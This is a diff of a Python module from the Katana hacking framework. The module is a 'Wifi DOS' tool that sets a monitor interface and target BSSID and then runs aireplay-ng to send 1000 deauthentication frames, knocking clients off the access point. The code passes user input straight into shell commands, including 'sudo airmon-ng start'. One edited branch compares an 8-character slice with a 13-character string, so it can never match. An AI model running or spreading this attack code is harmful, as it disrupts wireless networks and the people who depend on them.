@@ -3,6 +3,7 @@
 # Modules   : Wifi DOS       #
 # Script by : RedToor        #
 # Date      : 11/06/2015     #
+# Version   : 2.0 BUilding   #
 # :-:-:-:-:-:-:-:-:-:-:-:-:- #
 # Katana Core                #
 from core.design import *    #
@@ -19,25 +20,19 @@ import commands              #
 # :-:-:-:-:-:-:-:-:-:-:-:-:- #
 # Default                    #
 # :-:-:-:-:-:-:-:-:-:-:-:-:- #
-defaultcar=INTERFACE_DEVICE
 defaultint=INTERFACE_MONITOR
 defaultmac=MAC_TARGET
-defaultcha=CHANNEL_TARGET
-defaultess=ESSID_TARGET
 # :-:-:-:-:-:-:-:-:-:-:-:-:- #
 
 def run(card,monitor,mac,channel,essid):
-	global defaultcar,defaultint,defaultmac,defaultcha,defaultess
-	defaultcar=card
+	global defaultint,defaultmac
 	defaultint=monitor
 	defaultmac=mac
-	defaultcha=channel
-	defaultess=essid
 	ddos(1)
 
 
 def ddos(run):
-	global defaultcar,defaultint,defaultmac,defaultcha,defaultess
+	global defaultint,defaultmac
 	try:
 		if run!=1:
 			actions=raw_input(d.prompt("wifi/dos"))
@@ -45,33 +40,21 @@ def ddos(run):
 			actions="run"
 		if actions == "show options" or actions == "sop":
 			d.option()
-			d.descrip("intf","yes","Interface card",defaultcar)
-			d.descrip("intm","yes","Int... monitor",defaultint)
-			d.descrip("bssid","yes","Mac address",defaultmac)
-			d.descrip("essid","yes","Name of AP",defaultess)
-			d.descrip("chan","yes","Channel red",defaultcha)
+			d.descrip("device","yes","Interface",defaultint)
+			d.descrip("bssid","yes","Mac Target",defaultmac)
 			d.helpAUX()
 			ping.interfaces(1)
 			ping.monitor()
 			d.space()
-		elif actions[0:8] == "set intf":
-			defaultcar=ping.update(defaultcar,actions,"intf")
-			d.change("intf",defaultcar)
-		elif actions[0:8] == "set intm":
-			defaultint=ping.update(defaultint,actions,"intm")
-			d.change("intm",defaultint)
+		elif actions[0:8] == "set interface":
+			defaultint=ping.update(defaultint,actions,"interface")
+			d.change("interface",defaultint)
 		elif actions[0:9] == "set bssid":
 			defaultmac=ping.update(defaultmac,actions,"bssid")
 			d.change("bssid",defaultmac)
-		elif actions[0:9] == "set essid":
-			defaultess=ping.update(defaultess,actions,"essid")
-			d.change("essid",defaultess)
-		elif actions[0:8] == "set chan":
-			defaultcha=ping.update(defaultcha,actions,"chan")
-			d.change("chan",defaultcha)
 		elif actions[0:5] == "start":
 			start = actions[6:]
-			print " "+Alr+" Starting Monitor Mode In "+start,ping.status_cmd("airmon-ng start "+start,"\t\t\t")
+			print " "+Alr+" Starting Monitor Mode In "+start,ping.status_cmd("sudo airmon-ng start "+start,"\t\t\t")
 		elif actions=="exit" or actions=="x":
 			d.goodbye()
 			exit()
@@ -82,13 +65,13 @@ def ddos(run):
 		elif actions=="run"  or actions=="r":
 			d.run()
 			try:
-				print " "+Alr+" Starting attack..."
+				print " "+Alr+" Starting attack to "+defaultmac
 				subprocess.call('aireplay-ng --deauth 1000 -a '+defaultmac+' '+defaultint, shell=True)
-			except(KeyboardInterrupt, SystemExit):
-				print("\n "+Alr+" Stopped DDOS")
+			except:
+				Errors.Errors(event=sys.exc_info(), info=3)
 		else:
-			d.nocommand()
+			Errors.Errors(event=sys.exc_info(), info=2)
 	except:
-		d.kbi()
-		exit()
+		Errors.Errors(event=sys.exc_info(), info=1)
 	ddos(0)
+
